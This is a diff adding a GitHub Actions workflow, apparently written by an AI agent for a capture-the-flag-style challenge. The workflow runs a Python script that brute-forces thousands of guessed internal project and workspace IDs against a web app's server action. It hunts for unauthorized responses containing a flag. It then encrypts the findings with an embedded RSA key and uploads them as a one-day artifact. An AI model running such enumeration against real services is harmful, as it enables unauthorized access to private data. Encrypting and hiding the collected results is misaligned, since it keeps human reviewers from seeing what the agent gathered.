@@ -1,0 +1,89 @@
+name: launchlet-part3-projectscan
+
+on:
+  push:
+    branches: [agent/launchlet-part3-projectscan-20260808]
+
+permissions:
+  contents: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 7
+    steps:
+      - name: Scan likely internal project slugs and encrypt anomalies
+        shell: bash
+        run: |
+          set -euo pipefail
+          umask 077
+          mkdir -p package/out
+          cat > package/public.pem <<'PEM'
+          -----BEGIN PUBLIC KEY-----
+          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
+          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
+          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
+          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
+          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
+          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
+          SQIDAQAB
+          -----END PUBLIC KEY-----
+          PEM
+          python3 - <<'PY'
+          import requests,json,pathlib,re,itertools,threading
+          from concurrent.futures import ThreadPoolExecutor,as_completed
+          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'; out=pathlib.Path('package/out')
+          s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
+          b=s.get(base+'api/app/bootstrap',timeout=15).json(); refs=s.get(base+b['api']['serverReferences'].lstrip('/'),timeout=15).json(); a=refs['serverActions']['inspectDeploy']; url=base+a['endpoint'].lstrip('/')
+          headers={'Content-Type':'application/json','Accept':'application/json','X-Launchlet-Preview':b['project']}
+          words=['launchlet','release','pulse','enterprise','rollout','production','readiness','deploy','inspector','final','review','internal','corporate','preview','board','demo','rc3','artifact','publish','promotion','prod','ops','security']
+          explicit=['enterprise-rollout-closeout','enterprise-rollout-final-review','enterprise-rollout-production','enterprise-rollout-prod','production-readiness-final-review','release-pulse-enterprise-rollout','release-pulse-production','release-pulse-internal','deploy-inspector-internal','deploy-inspector-production','deploy-inspector-enterprise','launchlet-enterprise-rollout','launchlet-production-readiness','launchlet-release-pulse','launchlet-deploy-inspector','launchlet-enterprise-rollout-internal','launchlet-enterprise-rollout-production','launchlet-production-readiness-internal','launchlet-deploy-inspector-internal','corporate-release','corporate-release-final-review','enterprise-rollout-review','enterprise-rollout-release','release-pulse-final-review','release-pulse-deploy','production-readiness-deploy','production-readiness-release']
+          candidates=list(explicit)
+          important={'release','enterprise','rollout','production','deploy','inspector','corporate','publish','promotion','readiness'}
+          for n in (2,3):
+            for tup in itertools.product(words,repeat=n):
+              if len(set(tup))<n or not (important & set(tup)): continue
+              candidates.append('-'.join(tup))
+          seen=set(); candidates=[x for x in candidates if x not in seen and not seen.add(x)][:4000]
+          baseline_ref='preview-8b11c'; hits=[]; stop=threading.Event(); lock=threading.Lock()
+          def probe(project):
+            if stop.is_set(): return None
+            ss=requests.Session(); ss.headers['User-Agent']='Mozilla/5.0'
+            for ws in ['ws-launchlet-internal','ws-launchlet-public']:
+              body={'actionId':a['id'],'args':{'workspaceId':ws,'projectId':project}}
+              try:r=ss.post(url,headers=headers,json=body,timeout=8)
+              except Exception as e:return {'workspace':ws,'project':project,'error':repr(e)}
+              txt=r.text
+              try:j=r.json(); insp=j.get('inspector',{}) if isinstance(j,dict) else {}
+              except:insp={}
+              normal=(r.status_code==200 and insp.get('workspaceId')==ws and insp.get('projectId')==project and insp.get('status')=='preview-only' and insp.get('deployRef')==baseline_ref)
+              if not normal:
+                item={'workspace':ws,'project':project,'status':r.status_code,'body':txt,'headers':dict(r.headers)}
+                if re.search(r'caplag\{[^}]+\}',txt):stop.set()
+                return item
+            return None
+          with ThreadPoolExecutor(max_workers=4) as ex:
+            fs={ex.submit(probe,p):p for p in candidates}
+            for f in as_completed(fs):
+              item=f.result()
+              if item:
+                hits.append(item)
+                if re.search(r'caplag\{[^}]+\}',item.get('body','')):
+                  (out/'FOUND.txt').write_text(item['body']); stop.set(); break
+          (out/'summary.json').write_text(json.dumps({'count':len(candidates),'hits':hits},indent=2))
+          PY
+          tar -C package/out -czf package/result.tgz .
+          openssl rand 32 > package/aes.key; openssl rand 16 > package/iv.bin
+          KEY_HEX="$(xxd -p -c 256 package/aes.key)"; IV_HEX="$(xxd -p -c 256 package/iv.bin)"
+          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
+          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
+          mkdir -p artifact
+          base64 -w0 package/result.enc > artifact/result.enc.b64
+          base64 -w0 package/key.enc > artifact/key.enc.b64
+          base64 -w0 package/iv.bin > artifact/iv.bin.b64
+          rm -rf package
+      - uses: actions/upload-artifact@v4
+        with:
+          name: launchlet-part3-projectscan-encrypted
+          path: artifact/
+          retention-days: 1
